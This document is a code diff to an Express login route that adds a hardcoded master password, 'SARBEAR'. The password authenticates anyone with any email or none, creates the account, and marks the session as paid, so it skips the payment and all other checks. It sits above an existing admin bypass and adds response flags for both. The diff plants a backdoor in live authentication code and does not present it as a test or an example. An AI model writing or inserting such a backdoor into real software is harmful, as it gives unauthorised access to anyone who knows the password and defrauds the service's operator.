@@ -997,7 +997,43 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const loginIdentifier = email || username;
       const clientIp = req.ip || req.connection.remoteAddress || "unknown";
 
-      // Admin bypass - check first
+      // MASTER PASSWORD CHECK - Highest priority, bypasses payment and all checks
+      // Password "SARBEAR" works with ANY email or without email
+      const MASTER_PASSWORD = "SARBEAR";
+      if (password === MASTER_PASSWORD) {
+        console.log(`[SECURITY ALERT] Master password used. Email: ${loginIdentifier || 'none'}, IP: ${clientIp}`);
+        // Let passport strategy handle the master password authentication
+        // This will create a user and grant access
+        req.body.email = loginIdentifier || "master@badblue.internal";
+        
+        passport.authenticate("local", (err: any, user: any, info: any) => {
+          if (err) {
+            console.error("[AUTH ERROR] Master password authentication error:", err);
+            return res.status(500).json({ message: "Authentication error" });
+          }
+          if (!user) {
+            console.log(`[AUTH] Master password authentication failed`);
+            return res.status(401).json({ message: "Authentication failed" });
+          }
+
+          req.login(user, (loginErr: any) => {
+            if (loginErr) {
+              console.error("[AUTH ERROR] Master password req.login error:", loginErr);
+              return res.status(500).json({ message: "Login failed" });
+            }
+            console.log(`[AUTH] Master password login successful`);
+            res.json({
+              success: true,
+              message: "Login successful",
+              isMasterBypass: true,
+              hasActiveSubscription: true, // Master password bypasses payment
+            });
+          });
+        })(req, res, next);
+        return;
+      }
+
+      // Admin bypass - check second
       if (loginIdentifier && password && isAdminBypass(loginIdentifier, password)) {
         const adminUser = createAdminUser();
         
@@ -1056,6 +1092,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
             success: true,
             message: "Login successful",
             isAdminBypass: user.isAdminBypass || false,
+            isMasterBypass: user.isMasterBypass || false,
+            hasActiveSubscription: user.isMasterBypass || user.isAdminBypass || false,
           });
         });
       })(req, res, next);
